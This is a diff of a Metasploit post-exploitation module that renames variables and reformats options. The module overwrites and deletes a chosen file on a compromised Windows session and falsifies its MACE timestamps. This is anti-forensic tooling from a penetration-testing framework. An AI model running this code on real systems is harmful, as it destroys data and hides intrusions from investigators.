@@ -33,17 +33,20 @@ class MetasploitModule < Msf::Post
               stdapi_sys_config_getenv
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
 
-    register_options(
-      [
-        OptBool.new('ZERO', [ false, 'Zero overwrite. If set to false, random data will be used', false]),
-        OptInt.new('ITERATIONS', [false, 'The number of overwrite passes', 1 ]),
-        OptString.new('FILE', [true, 'File to be deleted', ''])
-      ]
-    )
+    register_options([
+      OptBool.new('ZERO', [ false, 'Zero overwrite. If set to false, random data will be used', false]),
+      OptInt.new('ITERATIONS', [false, 'The number of overwrite passes', 1 ]),
+      OptString.new('FILE', [true, 'File to be deleted', ''])
+    ])
   end
 
   def run
@@ -84,13 +87,13 @@ class MetasploitModule < Msf::Post
       print_status("The file is too small. If it's store in the MTF (NTFS) sdel will not overwrite it!")
     end
 
-    sizeC = size_cluster
-    size_ = size_file.divmod(sizeC)
+    cluster_size = size_cluster
+    size_ = size_file.divmod(cluster_size)
 
     if size_.last != 0
-      real_size = (size_.first * sizeC) + sizeC
+      real_size = (size_.first * cluster_size) + cluster_size
     else
-      real_size = size_.first * sizeC
+      real_size = size_.first * cluster_size
     end
 
     print_status("Size on disk: #{real_size}")
@@ -99,14 +102,14 @@ class MetasploitModule < Msf::Post
 
   # Change MACE attributes. Get a fake date by subtracting N days from the current date
   def change_mace(file)
-    rsec = Rex::Text.rand_text_numeric(7, bad = '012')
+    rsec = Rex::Text.rand_text_numeric(7, '012')
     date = Time.now - rsec.to_i
     print_status('Changing MACE attributes')
     session.priv.fs.set_file_mace(file, date, date, date, date)
   end
 
   # Function to overwrite the file
-  def file_overwrite(file, type, n)
+  def file_overwrite(file, type, num)
     # FILE_FLAG_WRITE_THROUGH: Write operations will go directly to disk
     r = session.railgun.kernel32.CreateFileA(file, 'GENERIC_WRITE', 'FILE_SHARE_READ|FILE_SHARE_WRITE', nil, 'OPEN_EXISTING', 'FILE_FLAG_WRITE_THROUGH', 0)
     handle = r['return']
@@ -117,9 +120,9 @@ class MetasploitModule < Msf::Post
     end
 
     i = 0
-    n.times do
+    num.times do
       i += 1
-      print_status("Iteration #{i}/#{n}:")
+      print_status("Iteration #{i}/#{num}:")
 
       if type == 1
         random = Rex::Text.rand_text(real_size, nil)
